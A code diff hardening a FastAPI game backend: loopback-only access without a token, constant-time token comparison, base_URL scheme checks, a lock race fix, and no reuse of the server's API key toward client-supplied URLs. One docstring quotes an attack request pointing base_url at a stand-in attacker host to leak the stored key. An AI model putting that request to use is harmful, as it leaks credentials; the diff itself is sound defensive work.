@@ -20,10 +20,13 @@
 """
 from __future__ import annotations
 
+import hmac
+import ipaddress
 import json
 import os
 import sys
 import threading
+import urllib.parse
 
 from fastapi import FastAPI, HTTPException, Request
 from pydantic import BaseModel
@@ -60,14 +63,62 @@ _ai = None             # 服务端 AIClient（可禁用）
 _AUTH_TOKEN = (os.environ.get("SONGZUO_SERVER_TOKEN") or "").strip()
 
 
+def _client_is_loopback(request) -> bool:
+    """请求来源是否为本机回环（用于「未配 token 时的兜底放行」判定）。"""
+    client = getattr(request, "client", None)
+    host = str(getattr(client, "host", "") or "")
+    if not host:
+        return False
+    if host in ("localhost",):
+        return True
+    try:
+        return ipaddress.ip_address(host).is_loopback
+    except ValueError:
+        return False
+
+
 def _require_auth(request) -> None:
-    """非本机或已配置 token 时强制校验 Authorization: Bearer。"""
-    if not _AUTH_TOKEN:
-        return
+    """鉴权（安全审查 A4）。
+
+    规则与 Rust 端 auth_mw 同构：
+      - 已配置 SONGZUO_SERVER_TOKEN：必须携带匹配的 `Authorization: Bearer <token>`
+        （比较用 hmac.compare_digest，避免时序侧信道）；
+      - 未配置：**仅放行本机回环来源**。
+
+    修复前：未配 token 即 `return` 全放行，而「非回环必须设 token」的校验只写在
+    `main()` 里 —— 用 `uvicorn backend.server:app --host 0.0.0.0`（或任意 ASGI
+    服务器挂载 `app`）即可绕过，非回环部署下所有 /api/* 匿名可用。
+    """
     auth = request.headers.get("authorization") or request.headers.get("Authorization") or ""
-    if auth == f"Bearer {_AUTH_TOKEN}":
+    if _AUTH_TOKEN:
+        if hmac.compare_digest(auth, f"Bearer {_AUTH_TOKEN}"):
+            return
+        raise HTTPException(status_code=401, detail="令符不合，未获授权。")
+    if _client_is_loopback(request):
         return
-    raise HTTPException(status_code=401, detail="令符不合，未获授权。")
+    raise HTTPException(
+        status_code=401,
+        detail="服务端未配置 SONGZUO_SERVER_TOKEN，且来源非本机，拒绝访问。",
+    )
+
+
+def _validate_base_url(url: str) -> str:
+    """校验 AI base_url（安全审查 A4/B4）。
+
+    只允许 http/https 且必须含主机名 —— 阻断 `file:`/`gopher:`/`ftp:` 等
+    协议被带入 urllib/requests 请求链。返回规整后的 URL 或抛 400。
+    """
+    raw = (url or "").strip()
+    if not raw:
+        raise HTTPException(status_code=400, detail="Base URL 不可为空")
+    try:
+        parsed = urllib.parse.urlsplit(raw)
+    except Exception:
+        raise HTTPException(status_code=400, detail="Base URL 格式不合法")
+    if parsed.scheme not in ("http", "https") or not parsed.hostname:
+        raise HTTPException(
+            status_code=400, detail="Base URL 必须是含主机名的 http(s) 地址")
+    return raw
 
 
 def _build_ai() -> AIClient:
@@ -276,8 +327,12 @@ def api_new_game(req: NewGameReq, request: Request):
 def api_advance(request: Request):
     global _state
     _require_auth(request)
-    _require_state()
+    # D 修复（并发一致性）：状态判空必须与后续读写同在锁内。原实现在 `with _lock`
+    # **之前**调用 _require_state()，而 `_state` 在锁内被 advance/load 重新赋值 →
+    # 并发请求可能读到刚被替换/尚未替换的旧对象（「刚 load 完却判未开局 409」或
+    # 对旧 state 执行动作）。
     with _lock:
+        _require_state()
         events, log, report, _state = _backend.advance(_state, _get_ai())
         # 审查 P1-12：缓存本回合完整事件对象（含 choices），供 /api/resolve_event 按 title
         # 反查（前端契约只传 title）。下划线前缀字段由 _state_to_dict 过滤，不下发。
@@ -294,8 +349,12 @@ def api_advance(request: Request):
 def api_action(req: ActionReq, request: Request):
     global _state
     _require_auth(request)
-    _require_state()
+    # D 修复（并发一致性）：状态判空必须与后续读写同在锁内。原实现在 `with _lock`
+    # **之前**调用 _require_state()，而 `_state` 在锁内被 advance/load 重新赋值 →
+    # 并发请求可能读到刚被替换/尚未替换的旧对象（「刚 load 完却判未开局 409」或
+    # 对旧 state 执行动作）。
     with _lock:
+        _require_state()
         try:
             message, _state = _backend.action(_state, req.action, req.params, _get_ai())
         except ValueError as e:
@@ -307,8 +366,12 @@ def api_action(req: ActionReq, request: Request):
 def api_resolve_event(req: ResolveReq, request: Request):
     global _state
     _require_auth(request)
-    _require_state()
+    # D 修复（并发一致性）：状态判空必须与后续读写同在锁内。原实现在 `with _lock`
+    # **之前**调用 _require_state()，而 `_state` 在锁内被 advance/load 重新赋值 →
+    # 并发请求可能读到刚被替换/尚未替换的旧对象（「刚 load 完却判未开局 409」或
+    # 对旧 state 执行动作）。
     with _lock:
+        _require_state()
         ev = req.event or _find_frontend_event(_state, req.title)
         if not isinstance(ev, dict) or not ev:
             raise HTTPException(
@@ -322,8 +385,12 @@ def api_resolve_event(req: ResolveReq, request: Request):
 @app.post("/api/save")
 def api_save(req: SlotReq, request: Request):
     _require_auth(request)
-    _require_state()
+    # D 修复（并发一致性）：状态判空必须与后续读写同在锁内。原实现在 `with _lock`
+    # **之前**调用 _require_state()，而 `_state` 在锁内被 advance/load 重新赋值 →
+    # 并发请求可能读到刚被替换/尚未替换的旧对象（「刚 load 完却判未开局 409」或
+    # 对旧 state 执行动作）。
     with _lock:
+        _require_state()
         _backend.save(_state, req.slot)
         return {"ok": True, "slot": req.slot}
 
@@ -355,8 +422,12 @@ def api_readouts(request: Request):
     # 审查补齐：本端点原漏鉴权，在设 SONGZUO_SERVER_TOKEN（或非本机部署由
     # main() 强制要求）时仍匿名可读军政/会计/群臣档案。此处与其他端点同规。
     _require_auth(request)
-    _require_state()
+    # D 修复（并发一致性）：状态判空必须与后续读写同在锁内。原实现在 `with _lock`
+    # **之前**调用 _require_state()，而 `_state` 在锁内被 advance/load 重新赋值 →
+    # 并发请求可能读到刚被替换/尚未替换的旧对象（「刚 load 完却判未开局 409」或
+    # 对旧 state 执行动作）。
     with _lock:
+        _require_state()
         s = _state
         try:
             s._derive_defense_lines()
@@ -434,8 +505,12 @@ def api_meter(request: Request):
     分组映射由 ai/token_meter.grouped_meter_rows 提供（单一权威源，Tk/Web 共用）。
     """
     _require_auth(request)
-    _require_state()
+    # D 修复（并发一致性）：状态判空必须与后续读写同在锁内。原实现在 `with _lock`
+    # **之前**调用 _require_state()，而 `_state` 在锁内被 advance/load 重新赋值 →
+    # 并发请求可能读到刚被替换/尚未替换的旧对象（「刚 load 完却判未开局 409」或
+    # 对旧 state 执行动作）。
     with _lock:
+        _require_state()
         from ai.token_meter import grouped_meter_rows
         ai = _get_ai()
         rows = grouped_meter_rows(ai, getattr(_state, "_dialogue_stats", None))
@@ -455,8 +530,12 @@ def api_meter(request: Request):
 def api_meter_reset(request: Request):
     """清零 Token 计量（客户端分桶 + 召对命中统计）。"""
     _require_auth(request)
-    _require_state()
+    # D 修复（并发一致性）：状态判空必须与后续读写同在锁内。原实现在 `with _lock`
+    # **之前**调用 _require_state()，而 `_state` 在锁内被 advance/load 重新赋值 →
+    # 并发请求可能读到刚被替换/尚未替换的旧对象（「刚 load 完却判未开局 409」或
+    # 对旧 state 执行动作）。
     with _lock:
+        _require_state()
         ai = _get_ai()
         try:
             if ai is not None and hasattr(ai, "reset_meter"):
@@ -472,8 +551,12 @@ def api_meter_reset(request: Request):
 @app.post("/api/conclude")
 def api_conclude(request: Request):
     _require_auth(request)
-    _require_state()
+    # D 修复（并发一致性）：状态判空必须与后续读写同在锁内。原实现在 `with _lock`
+    # **之前**调用 _require_state()，而 `_state` 在锁内被 advance/load 重新赋值 →
+    # 并发请求可能读到刚被替换/尚未替换的旧对象（「刚 load 完却判未开局 409」或
+    # 对旧 state 执行动作）。
     with _lock:
+        _require_state()
         eval_result, ai_eval = _backend.conclude(_state, _get_ai())
         return {"eval": _json_safe(eval_result), "ai_eval": ai_eval}
 
@@ -487,8 +570,12 @@ def api_council_review(req: CouncilReviewReq, request: Request):
     AI 不可用 → 返回规则兜底（明确标注，不伪造 AI 文本），与旧版 Tk 行为一致。
     """
     _require_auth(request)
-    _require_state()
+    # D 修复（并发一致性）：状态判空必须与后续读写同在锁内。原实现在 `with _lock`
+    # **之前**调用 _require_state()，而 `_state` 在锁内被 advance/load 重新赋值 →
+    # 并发请求可能读到刚被替换/尚未替换的旧对象（「刚 load 完却判未开局 409」或
+    # 对旧 state 执行动作）。
     with _lock:
+        _require_state()
         draft = _state.get_edict_draft(req.draft_id)
         if draft is None:
             raise HTTPException(status_code=404, detail="诏草已不存在。")
@@ -526,8 +613,12 @@ def api_decree_polish(req: DecreePolishReq, request: Request):
     draft_id 非空时把结果回写该诏草并清会签缓存（重入待签）。AI 未接入 → 明确 409。
     """
     _require_auth(request)
-    _require_state()
+    # D 修复（并发一致性）：状态判空必须与后续读写同在锁内。原实现在 `with _lock`
+    # **之前**调用 _require_state()，而 `_state` 在锁内被 advance/load 重新赋值 →
+    # 并发请求可能读到刚被替换/尚未替换的旧对象（「刚 load 完却判未开局 409」或
+    # 对旧 state 执行动作）。
     with _lock:
+        _require_state()
         ai = _get_ai()
         if ai is None or not getattr(ai, "available", False):
             raise HTTPException(status_code=409, detail="AI 未接入：请先在设置中配置 OpenAI 兼容 API")
@@ -567,8 +658,12 @@ def api_decree_polish(req: DecreePolishReq, request: Request):
 def api_decree_draft(req: DecreeDraftReq, request: Request):
     """润色稿入待签队列（迁移补齐：Tk「入待签」→ GameState.add_edict_draft）。"""
     _require_auth(request)
-    _require_state()
+    # D 修复（并发一致性）：状态判空必须与后续读写同在锁内。原实现在 `with _lock`
+    # **之前**调用 _require_state()，而 `_state` 在锁内被 advance/load 重新赋值 →
+    # 并发请求可能读到刚被替换/尚未替换的旧对象（「刚 load 完却判未开局 409」或
+    # 对旧 state 执行动作）。
     with _lock:
+        _require_state()
         if not isinstance(req.draft, dict) or not req.draft:
             raise HTTPException(status_code=400, detail="诏草不可为空")
         did = _state.add_edict_draft(dict(req.draft))
@@ -580,8 +675,12 @@ def api_decree_draft(req: DecreeDraftReq, request: Request):
 def api_decree_discard(req: DecreeDiscardReq, request: Request):
     """弃删诏草（迁移补齐：Tk「弃删」→ GameState.remove_edict_draft）。"""
     _require_auth(request)
-    _require_state()
+    # D 修复（并发一致性）：状态判空必须与后续读写同在锁内。原实现在 `with _lock`
+    # **之前**调用 _require_state()，而 `_state` 在锁内被 advance/load 重新赋值 →
+    # 并发请求可能读到刚被替换/尚未替换的旧对象（「刚 load 完却判未开局 409」或
+    # 对旧 state 执行动作）。
     with _lock:
+        _require_state()
         d = _state.get_edict_draft(req.draft_id)
         if d is None:
             raise HTTPException(status_code=404, detail="诏草已不存在")
@@ -597,8 +696,12 @@ def api_monthly_report(request: Request):
     AI 失败/未接入 → 本地模板 + 结构化真值兜底（与 /api/advance 的 report 同源，不伪造）。
     """
     _require_auth(request)
-    _require_state()
+    # D 修复（并发一致性）：状态判空必须与后续读写同在锁内。原实现在 `with _lock`
+    # **之前**调用 _require_state()，而 `_state` 在锁内被 advance/load 重新赋值 →
+    # 并发请求可能读到刚被替换/尚未替换的旧对象（「刚 load 完却判未开局 409」或
+    # 对旧 state 执行动作）。
     with _lock:
+        _require_state()
         from core.commands import _monthly_report_text
         try:
             text = _monthly_report_text(_state, _get_ai())
@@ -637,20 +740,36 @@ def api_ai_config_get(request: Request):
 
 @app.post("/api/fetch_models")
 def api_fetch_models(req: FetchModelsReq, request: Request):
-    """根据输入的 Key 与 Base URL，智能探测并拉取远程支持的模型列表。"""
+    """根据输入的 Key 与 Base URL，探测并拉取远程支持的模型列表。
+
+    安全审查 A2（凭据外泄）：修复前 key 为空时会回落读取服务端 ai_config.json
+    中的真实 Key，再以**客户端传入的 base_url** 发起请求 —— 攻击者只需
+    `POST {"base_url":"http://attacker.tld"}` 即可令服务端携带真 Key 外联。
+    现规则：仅当目标与「已配置端点」一致时才允许复用服务端 Key，绝不把
+    服务端密钥送往客户端指定的其它地址；同时 base_url 先做协议校验。
+    """
     _require_auth(request)
+    base_url = _validate_base_url(req.base_url)
+    key = (req.api_key or "").strip()
+    if not key:
+        try:
+            with open(_ai_config_path(), "r", encoding="utf-8") as f:
+                _cfg = json.load(f)
+        except Exception:
+            _cfg = {}
+        _cfg_url = str(_cfg.get("base_url", "") or "").strip().rstrip("/")
+        _cfg_key = str(_cfg.get("api_key", "") or "").strip()
+        if _cfg_key and _cfg_url and _cfg_url == base_url.rstrip("/"):
+            key = _cfg_key
+    if not key:
+        raise HTTPException(status_code=400, detail="请先填写 API Key 再探测模型")
     try:
         from ai.client import AIClient
-        key = req.api_key.strip()
-        # 若未填 key，尝试读已有配置
-        if not key:
-            try:
-                with open(_ai_config_path(), "r", encoding="utf-8") as f:
-                    key = str(json.load(f).get("api_key", "") or "").strip()
-            except Exception: pass
-        client = AIClient(api_key=key, base_url=req.base_url)
+        client = AIClient(api_key=key, base_url=base_url)
         models = client.fetch_available_models()
         return {"ok": True, "models": models}
+    except HTTPException:
+        raise
     except Exception as e:  # noqa: BLE001
         # 不回传完整异常栈/URL 细节给客户端
         return {"ok": False, "models": [], "error": type(e).__name__}
@@ -658,7 +777,12 @@ def api_fetch_models(req: FetchModelsReq, request: Request):
 
 @app.post("/api/ai_config")
 def api_ai_config_set(req: AiConfigReq, request: Request):
-    """写 AI 配置并重建服务端 AI 客户端（设置面板保存）。"""
+    """写 AI 配置并重建服务端 AI 客户端（设置面板保存）。
+
+    安全审查 A3：base_url 落盘前先做协议校验（阻断 file:/gopher: 等目标）。
+    健壮性修复（D）：联网探测移出全局锁 —— 原先持锁 probe（内置 15s+ 超时）
+    会把会话内其它请求（advance/save/readouts）一并阻塞。
+    """
     global _ai
     _require_auth(request)
     with _lock:
@@ -667,10 +791,13 @@ def api_ai_config_set(req: AiConfigReq, request: Request):
             with open(_ai_config_path(), "r", encoding="utf-8") as f:
                 old_cfg = json.load(f)
         except Exception: pass
-        
+
         # 若传入 key 为空但已有 key，保持已有 key 不被洗掉
         key_to_save = req.api_key.strip() or str(old_cfg.get("api_key", "") or "")
-        cfg = {"api_key": key_to_save, "base_url": req.base_url.strip(), "model": req.model.strip(),
+        base_in = (req.base_url or "").strip()
+        base_url = (_validate_base_url(base_in) if base_in
+                    else str(old_cfg.get("base_url", "") or ""))
+        cfg = {"api_key": key_to_save, "base_url": base_url, "model": req.model.strip(),
                # 迁移补齐：办差工具三档（未传则沿用旧值/auto）
                "enable_tools": (req.enable_tools.strip()
                                 or str(old_cfg.get("enable_tools", "") or "auto"))}
@@ -678,18 +805,22 @@ def api_ai_config_set(req: AiConfigReq, request: Request):
             json.dump(cfg, f, ensure_ascii=False, indent=2)
         _ai = None  # 重建客户端
         client = _get_ai()
-        # 强制做一次在线真实探测
-        ok, msg = False, "未配置"
-        if client:
+
+    # 强制做一次在线真实探测（锁外执行，避免阻塞其它请求）
+    ok, msg = False, "未配置"
+    if client:
+        try:
             ok, msg = client.probe(force=True)
-        return {
-            "ok": True,
-            "available": ok,
-            "message": msg,
-            "has_key": bool(key_to_save),
-            "base_url": cfg["base_url"],
-            "model": cfg["model"]
-        }
+        except Exception as e:  # noqa: BLE001
+            ok, msg = False, f"探测失败：{type(e).__name__}"
+    return {
+        "ok": True,
+        "available": ok,
+        "message": msg,
+        "has_key": bool(key_to_save),
+        "base_url": cfg["base_url"],
+        "model": cfg["model"]
+    }
 
 
 def main() -> None:
